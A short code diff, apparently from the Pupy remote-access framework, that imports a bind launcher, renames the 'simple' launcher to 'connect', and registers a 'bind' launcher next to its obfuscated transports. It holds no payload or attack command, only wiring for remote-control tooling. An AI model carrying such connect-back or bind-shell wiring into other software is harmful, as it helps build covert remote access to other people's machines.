@@ -8,6 +8,7 @@ from .servers import PupyTCPServer
 from .clients import PupyTCPClient, PupySSLClient, PupyProxifiedTCPClient, PupyProxifiedSSLClient
 from .transports import dummy, b64
 from .transports.obfs3 import obfs3
+
 try:
 	from .transports.scramblesuit import scramblesuit
 except ImportError as e:
@@ -17,6 +18,7 @@ except ImportError as e:
 from .streams import PupySocketStream
 from .launchers.simple import SimpleLauncher
 from .launchers.auto_proxy import AutoProxyLauncher
+from .launchers.bind import BindLauncher
 try:
 	import ConfigParser as configparser
 except ImportError:
@@ -122,6 +124,7 @@ if scramblesuit:
 			"server_transport_kwargs": {"password":scramblesuit_passwd},
 		}
 
-launchers["simple"]=SimpleLauncher
+launchers["connect"]=SimpleLauncher
 launchers["auto_proxy"]=AutoProxyLauncher
+launchers["bind"]=BindLauncher
 
